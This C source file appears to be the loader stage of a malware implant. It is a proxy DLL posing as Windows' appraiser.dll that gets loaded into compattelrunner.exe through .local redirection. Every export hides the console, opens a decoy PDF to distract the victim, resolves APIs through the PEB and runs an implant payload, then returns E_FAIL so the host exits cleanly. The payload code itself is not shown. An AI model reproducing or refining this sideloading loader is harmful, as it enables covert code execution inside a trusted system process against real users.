// carrier proxy: every export is a real function, no forwarders.
//
// With the marker present, .local resolves every load of the dependency's
// basename -- name, full path, or LOAD_LIBRARY_SEARCH_SYSTEM32 -- back to
// this module, so the genuine appraiser.dll is unreachable through the
// loader and no forwarding exists. Observed caller contract (compattel-
// runner.exe, build 26200, runtime-probed with tools/log_stub.c):
//   - the host loads the plugin with LoadLibraryExW(..., 0x800) and
//     resolves the -f: name with GetProcAddress;
//   - it invokes DoScheduledTelemetryRunTC(rcx=0, rdx=0, r8=context, r9=6);
//   - the result is consumed as an HRESULT: E_FAIL aborts the run cleanly.
// Functional equivalence is a non-goal: the run simply never completes
// when the payload blocks inside the trigger call.
#include <windows.h>
#include <winternl.h>

#include "implant.h"
#include "proxy.h"
#include "resolve.h"
#include "runtime.h"

#define INIT_UNINIT 0
#define INIT_BUSY   1
#define INIT_DONE   2

static volatile long init_state;

// Any address inside this module identifies it; see open_decoy.
static const char self_tag = 0;

// Open the first "*.pdf" found in the directory at dir (needs trailing slash).
static int open_decoy_at(char *dir, size_t len)
{
    WIN32_FIND_DATAA fd;
    HANDLE h;

    if (len + 6 >= MAX_PATH)                  // room for "*.pdf" plus a name
        return 0;
    lstrcpyA(dir + len, "*.pdf");

    h = FindFirstFileA(dir, &fd);
    if (h == INVALID_HANDLE_VALUE)
        return 0;
    FindClose(h);

    if (len + lstrlenA(fd.cFileName) + 1 > MAX_PATH)
        return 0;
    lstrcpyA(dir + len, fd.cFileName);
    return (INT_PTR)ShellExecuteA(NULL, "open", dir, NULL, NULL,
                                  SW_SHOWNORMAL) > 32;
}

// The decoy lives in the package root: beside this DLL in file form
// (host.exe.local marker), one directory up in folder form (host.exe.local\).
static void open_decoy(void)
{
    char dir[MAX_PATH];
    HMODULE self = 0;
    DWORD n;
    size_t len;

    // A data address identifies the module; a function pointer conversion is not defined.
    if (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                            (LPCSTR)(const void *)&self_tag, &self))
        return;

    n = GetModuleFileNameA(self, dir, MAX_PATH);
    if (n == 0 || n >= MAX_PATH)
        return;
    while (n > 0 && dir[n - 1] != '\\')
        n--;
    if (n == 0)
        return;
    len = (size_t)n;

    if (open_decoy_at(dir, len))
        return;

    // Folder form: strip "host.exe.local\" too and try the parent.
    while (len > 0 && dir[len - 1] != '\\')
        len--;
    if (len > 0)
        len--;
    while (len > 0 && dir[len - 1] != '\\')
        len--;
    if (len == 0)
        return;
    open_decoy_at(dir, len);
}

void once(void)
{
    context ctx = { 0 };

    if (InterlockedCompareExchange(&init_state, INIT_BUSY, INIT_UNINIT)
        != INIT_UNINIT)
        return;

    FreeConsole();
    open_decoy();

    ctx.peb = (peb *)NtCurrentTeb()->ProcessEnvironmentBlock;

    if (resolve_all(&ctx) == OK)
        payload(&ctx);

    InterlockedExchange(&init_state, INIT_DONE);
}

// Every entry: run the stage once, then report the observed failure code.
// Only DoScheduledTelemetryRunTC is reachable through this host (its -f:
// whitelist); the remaining exports exist for EAT parity and are never
// exercised, so uniform failure semantics are the honest stub.
#define ENTRY(name)                                             \
    long name(void *a, void *b, void *c, void *d)               \
    {                                                           \
        (void)a; (void)b; (void)c; (void)d;                     \
        once();                                                 \
        return (long)E_FAIL;                                    \
    }

ENTRY(DoProcessRestoreApps)
ENTRY(DoScheduledTelemetryRun)
ENTRY(DoScheduledTelemetryRunTC)
ENTRY(GetCtacProvider)
ENTRY(GetProvider)
ENTRY(GetTargetVersionList)
ENTRY(ProcessRestoreApps)
ENTRY(RunTest)
ENTRY(RunXml)
ENTRY(Sgd)
ENTRY(UpdateAvStatus)
ENTRY(UpdateCacheCompatStatuses)
ENTRY(UpdateExperienceIndicators)
